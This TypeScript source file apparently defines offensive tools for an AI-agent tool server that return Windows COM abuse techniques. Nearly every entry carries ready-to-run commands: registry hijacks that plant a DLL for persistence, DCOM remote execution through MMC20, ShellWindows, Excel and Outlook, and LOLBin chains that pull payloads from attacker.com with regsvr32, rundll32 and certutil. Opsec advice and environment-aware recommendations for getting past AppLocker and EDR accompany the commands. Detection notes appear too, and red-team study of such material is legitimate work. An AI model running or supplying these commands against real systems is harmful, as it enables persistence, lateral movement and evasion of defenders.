import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

interface COMTechnique {
  technique: string;
  description: string;
  platform: Platform;
  binary: string;
  command: string;
  cleanup_command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
  opsec_considerations: string;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ── com_hijack_persist ────────────────────────────────────────────────────────

const com_hijack_persist: ToolDef = {
  name: "com_hijack_persist",
  description:
    "Find COM object hijacking persistence techniques on Windows by manipulating InprocServer32 and TreatAs registry keys",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (COM hijacking is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbCom = ctx.knowledgeBase.searchByKeyword("COM", platform);
    const kbRegistry = ctx.knowledgeBase.searchByKeyword("InprocServer32", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbCom, ...kbRegistry])
      .filter(e => e.platform === platform);

    const techniques: COMTechnique[] = [
      {
        technique: "HKCU InprocServer32 Hijack",
        description: "Override a COM object's InprocServer32 in HKCU\\Software\\Classes\\CLSID to load a malicious DLL when the COM object is instantiated",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\evil.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" /f',
        stealth_score: 1,
        attck_ids: ["T1546.015"],
        prerequisites: ["User-level access", "Knowledge of target CLSID that is frequently instantiated"],
        detection_notes: "Monitor HKCU\\Software\\Classes\\CLSID for new InprocServer32 entries. Sysmon Event ID 13 (RegistryEvent). Autoruns COM tab.",
        opsec_considerations: "HKCU keys take precedence over HKLM — no admin needed. Choose CLSIDs triggered by common actions (e.g., Explorer shell extensions).",
      },
      {
        technique: "TreatAs CLSID Redirect",
        description: "Set a TreatAs registry key to redirect instantiation of one COM CLSID to another attacker-controlled CLSID",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{legitimate-clsid}\\TreatAs" /ve /t REG_SZ /d "{attacker-clsid}" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{legitimate-clsid}\\TreatAs" /f',
        stealth_score: 1,
        attck_ids: ["T1546.015"],
        prerequisites: ["User-level access", "Attacker-controlled CLSID registered"],
        detection_notes: "Monitor for TreatAs subkeys under CLSID entries. Less commonly monitored than InprocServer32.",
        opsec_considerations: "Very uncommon technique — low detection signature but may break application functionality.",
      },
      {
        technique: "Scheduled Task COM Handler Hijack",
        description: "Hijack a scheduled task that uses a COM handler by overriding the handler's CLSID registration",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{task-com-handler-clsid}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\handler.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{task-com-handler-clsid}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{task-com-handler-clsid}" /f',
        stealth_score: 1,
        attck_ids: ["T1546.015", "T1053.005"],
        prerequisites: ["Knowledge of scheduled tasks using COM handlers", "User-level access"],
        detection_notes: "Correlate scheduled task COM handler CLSIDs with HKCU overrides. Sysmon Event ID 13.",
        opsec_considerations: "Triggers on schedule without creating new tasks — blends with legitimate task execution.",
      },
      {
        technique: "Shell Extension COM Hijack",
        description: "Register a malicious DLL as a shell extension COM object to execute when Explorer loads context menus or icon overlays",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{new-clsid}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\shellext.dll" /f && reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved" /v "{new-clsid}" /t REG_SZ /d "Custom Shell Extension" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{new-clsid}" /f && reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved" /v "{new-clsid}" /f',
        stealth_score: 2,
        attck_ids: ["T1546.015"],
        prerequisites: ["User-level access", "DLL that implements IShellExtInit or IContextMenu"],
        detection_notes: "Monitor Shell Extensions\\Approved for new entries. DLL loads from Explorer.exe.",
        opsec_considerations: "Executes in Explorer.exe context — high stealth. Must handle DLL load without crashing Explorer.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const registryKeys = session.state.registryKeys;
      const comKeys = registryKeys.filter(k =>
        k.path.toLowerCase().includes("clsid") || k.path.toLowerCase().includes("inprocserver32"),
      );

      sessionContext = {
        environment_id: session.id,
        existing_com_registry_keys: comKeys.length,
        privilege_level: session.state.privilegeLevel,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated privileges — both HKLM and HKCU COM hijacking are viable. HKLM affects all users."
          : "User-level access — HKCU COM hijacking is the primary vector. No elevation required.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── com_dcom_lateral ──────────────────────────────────────────────────────────

const com_dcom_lateral: ToolDef = {
  name: "com_dcom_lateral",
  description:
    "Find DCOM-based lateral movement techniques using exposed COM objects for remote code execution across Windows hosts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (DCOM lateral movement is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbDcom = ctx.knowledgeBase.searchByKeyword("DCOM", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbDcom])
      .filter(e => e.platform === platform);

    const techniques: COMTechnique[] = [
      {
        technique: "MMC20.Application (DCOM)",
        description: "Use the MMC20.Application DCOM object to execute commands on a remote host via the ExecuteShellCommand method",
        platform,
        binary: "powershell.exe",
        command: `$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<TARGET>")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\\out.txt","7")`,
        cleanup_command: "Remove the output file on target and release COM object",
        stealth_score: 2,
        attck_ids: ["T1021.003"],
        prerequisites: ["Admin credentials on target", "DCOM port (135) and dynamic RPC range accessible"],
        detection_notes: "Process creation from mmc.exe on target. DCOM event logs. Sysmon network connections on port 135.",
        opsec_considerations: "Does not create a service. Uses legitimate MMC COM object. Firewall must allow RPC.",
      },
      {
        technique: "ShellWindows (DCOM)",
        description: "Use the ShellWindows DCOM object (CLSID {9BA05972-F6A8-11CF-A442-00A0C90A8F39}) to execute commands via Explorer on a remote host",
        platform,
        binary: "powershell.exe",
        command: `$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","<TARGET>")); $item = $com.Item(); $item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\\out.txt","","",0)`,
        cleanup_command: "Remove the output file on target",
        stealth_score: 1,
        attck_ids: ["T1021.003"],
        prerequisites: ["Admin credentials on target", "Explorer.exe running on target", "DCOM access"],
        detection_notes: "Process creation from Explorer.exe. Network connections on port 135. Less commonly monitored than MMC.",
        opsec_considerations: "Executes under Explorer.exe context — blends with user activity. Requires active desktop session.",
      },
      {
        technique: "ShellBrowserWindow (DCOM)",
        description: "Use the ShellBrowserWindow DCOM object (CLSID {C08AFD90-F2A1-11D1-8455-00A0C91F3880}) for remote execution",
        platform,
        binary: "powershell.exe",
        command: `$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET>")); $com.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\\out.txt","","",0)`,
        cleanup_command: "Remove the output file on target",
        stealth_score: 1,
        attck_ids: ["T1021.003"],
        prerequisites: ["Admin credentials on target", "DCOM access"],
        detection_notes: "Similar to ShellWindows. Monitor for remote DCOM activation events.",
        opsec_considerations: "Variant of ShellWindows — useful if ShellWindows is blocked.",
      },
      {
        technique: "Excel.Application DDE (DCOM)",
        description: "Use the Excel.Application DCOM object to execute commands via DDE on a remote host with Office installed",
        platform,
        binary: "powershell.exe",
        command: `$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<TARGET>")); $com.DisplayAlerts = $false; $com.DDEInitiate("cmd","/c whoami > C:\\out.txt")`,
        cleanup_command: '$com.Quit(); [System.Runtime.InteropServices.Marshal]::ReleaseComObject($com)',
        stealth_score: 2,
        attck_ids: ["T1021.003", "T1559.002"],
        prerequisites: ["Microsoft Office installed on target", "DCOM access", "Admin credentials"],
        detection_notes: "Excel.exe spawning child processes. DDE protocol usage. Office application event logs.",
        opsec_considerations: "Requires Office on target. DDE may trigger security prompts in newer Office versions.",
      },
      {
        technique: "Outlook.Application (DCOM)",
        description: "Use the Outlook.Application DCOM object to execute shell commands or create malicious mail rules on a remote host",
        platform,
        binary: "powershell.exe",
        command: `$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","<TARGET>")); $shell = $com.CreateObject("Wscript.Shell"); $shell.Run("cmd.exe /c whoami > C:\\out.txt")`,
        cleanup_command: '[System.Runtime.InteropServices.Marshal]::ReleaseComObject($com)',
        stealth_score: 1,
        attck_ids: ["T1021.003"],
        prerequisites: ["Microsoft Outlook installed and configured on target", "DCOM access"],
        detection_notes: "Outlook.exe spawning child processes. COM object instantiation events.",
        opsec_considerations: "Uncommon technique. Target must have Outlook configured and running.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.networkAccess.internalSubnets.length > 0
          ? `Internal subnets detected: ${session.state.networkAccess.internalSubnets.join(", ")}. Scan for RPC (135) on these ranges for DCOM targets.`
          : "No internal subnet information available. Network reconnaissance recommended first.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── com_execution ─────────────────────────────────────────────────────────────

const com_execution: ToolDef = {
  name: "com_execution",
  description:
    "Find COM object execution proxy techniques on Windows to run arbitrary commands via trusted COM objects for defense evasion",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (COM execution is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExecution = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbCom = ctx.knowledgeBase.searchByKeyword("COM", platform);
    const kbEntries = deduplicateByBinary([...kbExecution, ...kbEvasion, ...kbCom])
      .filter(e => e.platform === platform);

    const techniques: COMTechnique[] = [
      {
        technique: "WScript.Shell via COM",
        description: "Instantiate WScript.Shell COM object to execute commands, bypassing direct cmd.exe invocation",
        platform,
        binary: "powershell.exe",
        command: `$wsh = New-Object -ComObject WScript.Shell; $wsh.Run("cmd.exe /c whoami > C:\\out.txt", 0, $false)`,
        cleanup_command: "[System.Runtime.InteropServices.Marshal]::ReleaseComObject($wsh)",
        stealth_score: 3,
        attck_ids: ["T1218.005"],
        prerequisites: ["PowerShell or script host access"],
        detection_notes: "COM object creation events. WScript.Shell usage in script block logs. AMSI inspection.",
        opsec_considerations: "Run method window style 0 hides window. Parent process is PowerShell, not cmd.",
      },
      {
        technique: "Shell.Application (ShellExecute)",
        description: "Use the Shell.Application COM object to execute programs with optional elevated UAC prompt",
        platform,
        binary: "powershell.exe",
        command: `$shell = New-Object -ComObject Shell.Application; $shell.ShellExecute("cmd.exe", "/c whoami > C:\\out.txt", "", "runas", 0)`,
        cleanup_command: "[System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell)",
        stealth_score: 3,
        attck_ids: ["T1218.005"],
        prerequisites: ["User-level access", "UAC prompt if using 'runas' verb"],
        detection_notes: "ShellExecute API usage. UAC event if elevated. Sysmon process creation.",
        opsec_considerations: "Can trigger UAC prompt if using runas verb. Without runas, runs as current user.",
      },
      {
        technique: "MMC20.Application ExecuteShellCommand",
        description: "Use the local MMC20.Application COM object to proxy command execution through mmc.exe",
        platform,
        binary: "powershell.exe",
        command: `$mmc = New-Object -ComObject MMC20.Application; $mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\\out.txt", "7")`,
        cleanup_command: "[System.Runtime.InteropServices.Marshal]::ReleaseComObject($mmc)",
        stealth_score: 2,
        attck_ids: ["T1218.005"],
        prerequisites: ["User-level access"],
        detection_notes: "mmc.exe spawning child processes. COM object instantiation. Process lineage analysis.",
        opsec_considerations: "Execution proxied through mmc.exe — may bypass application whitelisting rules targeting cmd.exe directly.",
      },
      {
        technique: "Scripting.FileSystemObject + WScript.Shell Chain",
        description: "Use Scripting.FileSystemObject to write a payload to disk then WScript.Shell to execute it, avoiding direct download-and-execute patterns",
        platform,
        binary: "cscript.exe",
        command: `cscript.exe /e:vbscript /b - <<< "Set fso = CreateObject(\"Scripting.FileSystemObject\") : Set f = fso.CreateTextFile(\"C:\\Users\\Public\\run.bat\", True) : f.WriteLine \"whoami > C:\\out.txt\" : f.Close : Set wsh = CreateObject(\"WScript.Shell\") : wsh.Run \"C:\\Users\\Public\\run.bat\", 0, True"`,
        cleanup_command: "del C:\\Users\\Public\\run.bat",
        stealth_score: 2,
        attck_ids: ["T1218.005", "T1059.005"],
        prerequisites: ["cscript.exe or wscript.exe available"],
        detection_notes: "cscript.exe process creation. File write events. Script host COM usage.",
        opsec_considerations: "Drops a file to disk. Use in-memory alternatives when possible.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const availableBins = session.state.installedBinaries.filter(b =>
        ["powershell.exe", "cscript.exe", "wscript.exe", "mshta.exe"].includes(b.toLowerCase()),
      );

      sessionContext = {
        environment_id: session.id,
        available_script_hosts: availableBins,
        amsi_enabled: session.state.amsiEnabled,
        applocker_enabled: session.state.appLockerEnabled,
        recommendations: session.state.appLockerEnabled
          ? "AppLocker is enabled — COM execution proxies may bypass binary whitelisting if the parent process is allowed."
          : "No AppLocker detected — direct execution is also viable, but COM proxies add evasion layer.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── com_scriptlet ─────────────────────────────────────────────────────────────

const com_scriptlet: ToolDef = {
  name: "com_scriptlet",
  description:
    "Find COM scriptlet (SCT) execution techniques on Windows using regsvr32, mshta, and rundll32 for defense evasion",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (COM scriptlets are Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbBypass = ctx.knowledgeBase.searchByFunction("awl_bypass", platform);
    const kbScriptlet = ctx.knowledgeBase.searchByKeyword("scriptlet", platform);
    const kbSct = ctx.knowledgeBase.searchByKeyword("sct", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbBypass, ...kbScriptlet, ...kbSct])
      .filter(e => e.platform === platform);

    const techniques: COMTechnique[] = [
      {
        technique: "regsvr32 /i Scriptlet Execution (Squiblydoo)",
        description: "Use regsvr32.exe to register a remote COM scriptlet (.sct) that contains arbitrary script code — bypasses AppLocker and most AWL",
        platform,
        binary: "regsvr32.exe",
        command: 'regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll',
        cleanup_command: "No persistent artifacts — scriptlet runs in memory",
        stealth_score: 2,
        attck_ids: ["T1218.010"],
        prerequisites: ["regsvr32.exe available (signed Microsoft binary)", "Network access to fetch .sct"],
        detection_notes: "Sysmon Event ID 1 (regsvr32 with /i: URL). Network connection from regsvr32.exe. Script block logging.",
        opsec_considerations: "regsvr32.exe is a signed Windows binary — bypasses default AppLocker rules. No admin required.",
      },
      {
        technique: "mshta.exe Inline VBScript COM Object",
        description: "Use mshta.exe to execute inline VBScript that instantiates COM objects for command execution",
        platform,
        binary: "mshta.exe",
        command: 'mshta.exe vbscript:Execute("Set wsh = CreateObject(""WScript.Shell"") : wsh.Run ""cmd.exe /c whoami > C:\\out.txt"", 0 : close")',
        cleanup_command: "No persistent artifacts",
        stealth_score: 2,
        attck_ids: ["T1218.005"],
        prerequisites: ["mshta.exe available (signed Microsoft binary)"],
        detection_notes: "mshta.exe with vbscript: protocol in command line. Process creation events. AMSI.",
        opsec_considerations: "Well-known LOLBin — may be specifically blocked or monitored. Consider alternatives if EDR is present.",
      },
      {
        technique: "rundll32 COM Scriptlet via url.dll",
        description: "Use rundll32.exe with url.dll to open a remote HTA or scriptlet file for execution",
        platform,
        binary: "rundll32.exe",
        command: "rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta",
        cleanup_command: "No persistent artifacts",
        stealth_score: 2,
        attck_ids: ["T1218.011"],
        prerequisites: ["rundll32.exe available", "Network access to fetch payload"],
        detection_notes: "rundll32.exe with url.dll. Network connection from rundll32. Unusual command-line arguments.",
        opsec_considerations: "Trusted binary executing remote content — bypasses basic application whitelisting.",
      },
      {
        technique: "certutil + regsvr32 Scriptlet Chain",
        description: "Use certutil to download a COM scriptlet then regsvr32 to execute it — two-stage LOLBin chain",
        platform,
        binary: "certutil.exe",
        command: 'certutil.exe -urlcache -split -f http://attacker.com/payload.sct C:\\Users\\Public\\payload.sct && regsvr32.exe /s /n /u /i:C:\\Users\\Public\\payload.sct scrobj.dll',
        cleanup_command: "del C:\\Users\\Public\\payload.sct && certutil.exe -urlcache -split -f http://attacker.com/payload.sct delete",
        stealth_score: 3,
        attck_ids: ["T1218.010", "T1105"],
        prerequisites: ["certutil.exe and regsvr32.exe available", "Network access"],
        detection_notes: "certutil with -urlcache flag. File creation events. regsvr32 with /i: argument.",
        opsec_considerations: "Two-stage — certutil download is well-detected. Consider alternative download methods.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const scriptHosts = session.state.installedBinaries.filter(b =>
        ["regsvr32.exe", "mshta.exe", "rundll32.exe", "certutil.exe"].includes(b.toLowerCase()),
      );

      sessionContext = {
        environment_id: session.id,
        available_scriptlet_hosts: scriptHosts,
        applocker_enabled: session.state.appLockerEnabled,
        amsi_enabled: session.state.amsiEnabled,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.appLockerEnabled
          ? "AppLocker is enabled — regsvr32 Squiblydoo and mshta inline execution are designed to bypass AWL. Prioritize these."
          : "AppLocker not detected — scriptlet execution adds evasion layer but direct execution may suffice.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── com_inventory ─────────────────────────────────────────────────────────────

const com_inventory: ToolDef = {
  name: "com_inventory",
  description:
    "Enumerate and discover COM objects on Windows for identifying hijackable CLSIDs, abandoned InprocServer32 entries, and exploitable DCOM applications",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (COM enumeration is Windows-specific)"),
    scope: z
      .enum(["hijackable", "dcom", "all"])
      .default("all")
      .describe("Scope of COM enumeration: hijackable (missing DLLs), dcom (remote-capable), or all"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;
    const scope = args.scope ?? "all";

    const kbCom = ctx.knowledgeBase.searchByKeyword("COM", platform);
    const kbDcom = ctx.knowledgeBase.searchByKeyword("DCOM", platform);
    const kbEntries = deduplicateByBinary([...kbCom, ...kbDcom])
      .filter(e => e.platform === platform);

    const enumerationCommands = [
      {
        name: "List All Registered CLSIDs",
        description: "Enumerate all COM CLSIDs registered in the system and current user hives",
        command: 'reg query "HKLM\\SOFTWARE\\Classes\\CLSID" /s /v InprocServer32 2>nul & reg query "HKCU\\SOFTWARE\\Classes\\CLSID" /s /v InprocServer32 2>nul',
        purpose: "Discover all registered COM objects and their DLL paths",
      },
      {
        name: "Find Missing DLL COM Objects (Hijackable)",
        description: "PowerShell script to find COM objects whose InprocServer32 DLL does not exist on disk",
        command: `Get-ChildItem -Path "HKLM:\\SOFTWARE\\Classes\\CLSID" -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "InprocServer32" } | ForEach-Object { $dll = $_.GetValue(""); if ($dll -and !(Test-Path $dll)) { [PSCustomObject]@{ CLSID = $_.PSParentPath.Split("\\")[-1]; MissingDLL = $dll } } }`,
        purpose: "Identify hijackable CLSIDs where the expected DLL is missing",
      },
      {
        name: "Enumerate DCOM Applications",
        description: "List DCOM applications and their LaunchPermission settings",
        command: "Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name | Format-Table -AutoSize",
        purpose: "Discover DCOM applications available for lateral movement",
      },
      {
        name: "Find HKCU-Overridable CLSIDs",
        description: "Identify CLSIDs registered in HKLM but not in HKCU, meaning they can be hijacked by adding an HKCU override",
        command: `$hklm = Get-ChildItem "HKLM:\\SOFTWARE\\Classes\\CLSID" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty PSChildName; $hkcu = Get-ChildItem "HKCU:\\SOFTWARE\\Classes\\CLSID" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty PSChildName; $hklm | Where-Object { $hkcu -notcontains $_ } | Select-Object -First 50`,
        purpose: "Find CLSIDs that can be overridden from user context without admin",
      },
      {
        name: "Monitor COM Object Instantiation (Process Monitor)",
        description: "Use Sysinternals Process Monitor filter to capture COM object loading events",
        command: 'Procmon.exe /AcceptEula /Quiet /BackingFile C:\\Users\\Public\\comlog.pml /Filter "Operation is RegOpenKey AND Path contains InprocServer32 AND Result is NAME NOT FOUND"',
        purpose: "Dynamically discover processes loading COM objects with missing DLLs",
      },
    ];

    const filteredCommands = scope === "all"
      ? enumerationCommands
      : scope === "hijackable"
        ? enumerationCommands.filter(c => c.name.includes("Missing") || c.name.includes("Overridable") || c.name.includes("Monitor"))
        : enumerationCommands.filter(c => c.name.includes("DCOM"));

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated access — full COM enumeration including HKLM and DCOM configuration is possible."
          : "User-level access — focus on HKCU-overridable CLSIDs and missing DLL discovery.",
      };
    }

    return json({
      platform,
      scope,
      total_commands: filteredCommands.length,
      enumeration_commands: filteredCommands,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const comAbuseTools: ToolDef[] = [
  com_hijack_persist,
  com_dcom_lateral,
  com_execution,
  com_scriptlet,
  com_inventory,
];
